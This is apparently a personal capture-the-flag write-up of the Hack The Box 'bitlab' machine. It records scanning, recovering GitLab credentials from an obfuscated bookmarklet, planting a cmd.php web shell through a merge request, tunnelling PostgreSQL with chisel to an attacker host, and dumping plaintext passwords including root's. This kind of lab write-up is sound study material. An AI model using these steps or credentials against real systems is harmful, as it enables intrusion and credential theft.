nmap
```
┌──(kali㉿kali)-[~/HTB/bitlab]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.204.158                          
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 07:22 EST
Nmap scan report for 10.129.204.158
Host is up (0.046s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.129.204.158/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 3.13 - 4.4 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.13 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.0 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   46.15 ms 10.10.14.1
2   46.76 ms 10.129.204.158

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.69 seconds
```

```
┌──(kali㉿kali)-[~/HTB/bitlab]
└─$ dirsearch -u http://10.129.204.158/ -x 400-500
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/bitlab/reports/http_10.129.204.158/__25-01-17_07-24-34.txt

Target: http://10.129.204.158/

[07:24:34] Starting: 
[07:24:37] 302 -  105B  - /php.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:24:37] 302 -  105B  - /jsp.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:24:37] 302 -  105B  - /aspx.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:24:37] 302 -  105B  - /html.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:24:37] 302 -  105B  - /js.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:24:38] 302 -  105B  - /.agilekeychain.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:13] 200 -  789B  - /.well-known/openid-configuration                 
[07:25:15] 302 -  105B  - /1.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:16] 302 -  105B  - /2010.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:17] 302 -  105B  - /2011.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:17] 302 -  105B  - /2012.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:17] 302 -  105B  - /2013.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:17] 302 -  105B  - /2014.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:17] 302 -  105B  - /2015.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:18] 302 -  105B  - /2016.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:18] 302 -  105B  - /2017.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:18] 302 -  105B  - /2018.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:18] 302 -  105B  - /2019.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:25:18] 302 -  105B  - /2020.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:26:28] 302 -  105B  - /archive.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:26:30] 302 -  105B  - /auth.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:26:33] 302 -  105B  - /backup.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:26:33] 302 -  105B  - /backups.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:26:47] 301 -   88B  - /ci/  ->  http://10.129.204.158/                  
[07:26:50] 302 -  105B  - /clients.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:26:52] 302 -  105B  - /com.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:26:55] 302 -  105B  - /config.php.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:26:57] 302 -  105B  - /configuration.php.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:27:07] 302 -  105B  - /dat.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:27:18] 302 -  105B  - /dump.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:27:21] 302 -  105B  - /engine.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:27:27] 200 -   13KB - /explore                                          
[07:27:27] 301 -  171B  - /favicon.ico  ->  http://10.129.204.158/assets/favicon-7901bd695fb93edb07975966062049829afb56cf11511236e61bcf425070e36e.png
[07:27:30] 302 -  105B  - /files.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:27:32] 302 -  105B  - /forum.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:27:35] 302 -   93B  - /gitlab/  ->  http://10.129.204.158/clave         
[07:27:35] 302 -   93B  - /gitlab  ->  http://10.129.204.158/clave          
[07:27:40] 301 -  235B  - /help  ->  http://10.129.204.158/help/            
[07:27:40] 200 -  870B  - /help/                                            
[07:27:41] 302 -  105B  - /home.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:27:49] 302 -  105B  - /index.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:27:55] 302 -  105B  - /joomla.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:28:15] 302 -  105B  - /master.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:28:16] 302 -  105B  - /media.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:28:24] 302 -  105B  - /my.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:28:25] 302 -  105B  - /mysql.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:28:28] 302 -  105B  - /new.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:28:32] 302 -  105B  - /old.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:29:00] 301 -  238B  - /profile  ->  http://10.129.204.158/profile/      
[07:29:00] 302 -   95B  - /projects  ->  http://10.129.204.158/explore      
[07:29:00] 302 -   95B  - /projects.php  ->  http://10.129.204.158/explore
[07:29:00] 302 -   95B  - /projects.aspx  ->  http://10.129.204.158/explore
[07:29:00] 302 -   95B  - /projects.js  ->  http://10.129.204.158/explore
[07:29:00] 302 -   95B  - /projects.html  ->  http://10.129.204.158/explore
[07:29:01] 302 -   95B  - /projects.jsp  ->  http://10.129.204.158/explore
[07:29:01] 200 -   13KB - /public                                           
[07:29:02] 200 -   13KB - /public/                                          
[07:29:03] 200 -   13KB - /public.html                                      
[07:29:09] 200 -    2KB - /robots.txt                                       
[07:29:10] 200 -   16KB - /root/                                            
[07:29:10] 200 -   16KB - /root                                             
[07:29:14] 200 -   13KB - /search.aspx                                      
[07:29:15] 200 -   13KB - /search.php
[07:29:15] 200 -   13KB - /search                                           
[07:29:15] 200 -   13KB - /search.jsp
[07:29:15] 200 -    3KB - /search.js                                        
[07:29:15] 200 -   13KB - /search.html
[07:29:24] 302 -  105B  - /site.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:29:28] 302 -  105B  - /sql.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:29:41] 302 -   93B  - /test  ->  http://10.129.204.158/clave            
[07:29:42] 302 -   93B  - /test/  ->  http://10.129.204.158/clave           
[07:29:53] 301 -   93B  - /users/admin  ->  http://10.129.204.158/admin     
[07:29:53] 301 -   97B  - /users/admin.php  ->  http://10.129.204.158/admin.php
[07:29:53] 301 -   93B  - /users/login  ->  http://10.129.204.158/login
[07:29:54] 301 -   98B  - /users/login.aspx  ->  http://10.129.204.158/login.aspx
[07:29:54] 301 -   97B  - /users/login.jsp  ->  http://10.129.204.158/login.jsp
[07:29:54] 301 -   98B  - /users/login.html  ->  http://10.129.204.158/login.html
[07:29:54] 301 -   97B  - /users/login.php  ->  http://10.129.204.158/login.php
[07:29:54] 301 -   96B  - /users/login.js  ->  http://10.129.204.158/login.js
[07:29:56] 302 -  105B  - /vb.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:30:07] 302 -  105B  - /web.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:30:09] 302 -  105B  - /website.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:30:10] 302 -  105B  - /wordpress.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:30:11] 302 -  105B  - /wp-config.php.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:30:13] 302 -  105B  - /wp.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:30:15] 302 -  105B  - /www.zip  ->  http://10.129.204.158/users/sign_in.zip
[07:30:16] 302 -  105B  - /wwwroot.zip  ->  http://10.129.204.158/users/sign_in.zip
                                                                             
Task Completed
```

![Pasted image 20250117202954](<0. Attachments/Pasted image 20250117202954.png>)

default cred - [Change default admin password from "5iveL!fe" to "password" (8a01a122) · Commits · GitLab.org / GitLab FOSS · GitLab](https://gitlab.com/gitlab-org/gitlab-foss/-/commit/8a01a1222875b190d32769f7a6e7a74720079d2a)

![Pasted image 20250117203405](<0. Attachments/Pasted image 20250117203405.png>)

![Pasted image 20250117203658](<0. Attachments/Pasted image 20250117203658.png>)
gitlab login is weird i cannot click this link after inspecting source

```
"javascript:(function(){ var _0x4b18=[&quot;\x76\x61\x6C\x75\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;,&quot;\x63\x6C\x61\x76\x65&quot;,&quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&quot;,&quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()" ADD_DATE="1554932142"
```
looks like some encoding

![Pasted image 20250117204125](<0. Attachments/Pasted image 20250117204125.png>)
apparently if i click on the bookmark, it autofills the creds

after changing type password to type text
![Pasted image 20250117204403](<0. Attachments/Pasted image 20250117204403.png>)
![Pasted image 20250117204415](<0. Attachments/Pasted image 20250117204415.png>)

clave - 11des0081x

![Pasted image 20250117205103](<0. Attachments/Pasted image 20250117205103.png>)

index.php --> add a line cmd.php --> hit start new merge request and commit change --> tick remove source branch and hit submit merge request --> click merge
![Pasted image 20250117211425](<0. Attachments/Pasted image 20250117211425.png>)

![Pasted image 20250117211733](<0. Attachments/Pasted image 20250117211733.png>)

![Pasted image 20250117211837](<0. Attachments/Pasted image 20250117211837.png>)

internal network
![Pasted image 20250117212118](<0. Attachments/Pasted image 20250117212118.png>)
```
time for i in {1..254}; do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
```

quick nmap of internal network
```
www-data@bitlab:/var/www/html/profile$ nmap  172.19.0.2-5 
nmap  172.19.0.2-5 

Starting Nmap 7.60 ( https://nmap.org ) at 2025-01-17 13:22 UTC
Nmap scan report for 172.19.0.2
Host is up (0.00037s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 172.19.0.3
Host is up (0.00094s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
5432/tcp open  postgresql

Nmap scan report for 172.19.0.4
Host is up (0.00091s latency).
All 1000 scanned ports on 172.19.0.4 are closed

Nmap scan report for 172.19.0.5
Host is up (0.00034s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8181/tcp open  intermapper

Nmap done: 4 IP addresses (4 hosts up) scanned in 13.31 seconds
```

![Pasted image 20250117212815](<0. Attachments/Pasted image 20250117212815.png>)
![Pasted image 20250117212853](<0. Attachments/Pasted image 20250117212853.png>)

```
chisel server -p 8000 --reverse
./chisel client 10.10.14.4:8000 R:5432:localhost:5432
```

![Pasted image 20250117213336](<0. Attachments/Pasted image 20250117213336.png>)

now we poke around in psql
```
┌──(kali㉿kali)-[~/HTB/bitlab]
└─$ psql -h 127.0.0.1 -p 5432 -U profiles
Password for user profiles: 
psql (16.3 (Debian 16.3-1+b1), server 10.4 (Ubuntu 10.4-2.pgdg18.04+1))
Type "help" for help.

profiles=> \list
                                                  List of databases
   Name    |  Owner   | Encoding | Locale Provider | Collate | Ctype | ICU Locale | ICU Rules |   Access privileges   
-----------+----------+----------+-----------------+---------+-------+------------+-----------+-----------------------
 gitlab    | postgres | UTF8     | libc            | C       | C     |            |           | =Tc/postgres         +
           |          |          |                 |         |       |            |           | postgres=CTc/postgres+
           |          |          |                 |         |       |            |           | gitlab=CTc/postgres
 postgres  | postgres | UTF8     | libc            | C       | C     |            |           | 
 profiles  | postgres | UTF8     | libc            | C       | C     |            |           | =Tc/postgres         +
           |          |          |                 |         |       |            |           | postgres=CTc/postgres+
           |          |          |                 |         |       |            |           | profiles=CTc/postgres
 template0 | postgres | UTF8     | libc            | C       | C     |            |           | =c/postgres          +
           |          |          |                 |         |       |            |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | C       | C     |            |           | =c/postgres          +
           |          |          |                 |         |       |            |           | postgres=CTc/postgres
(5 rows)

profiles=> \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | profiles | table | profiles
(1 row)

profiles=> select * from profiles;
 id | username |        password        
----+----------+------------------------
  1 | clave    | c3NoLXN0cjBuZy1wQHNz==
(1 row)
```

![Pasted image 20250117213535](<0. Attachments/Pasted image 20250117213535.png>)

now we can ssh
![Pasted image 20250117213648](<0. Attachments/Pasted image 20250117213648.png>)

priv esc
scp file transfer
![Pasted image 20250117214017](<0. Attachments/Pasted image 20250117214017.png>)

![Pasted image 20250117214047](<0. Attachments/Pasted image 20250117214047.png>)

we need to debug a file remoteconnection

root
password - `Qf7]8YSV.wDNF*[7d?j&eD4^`

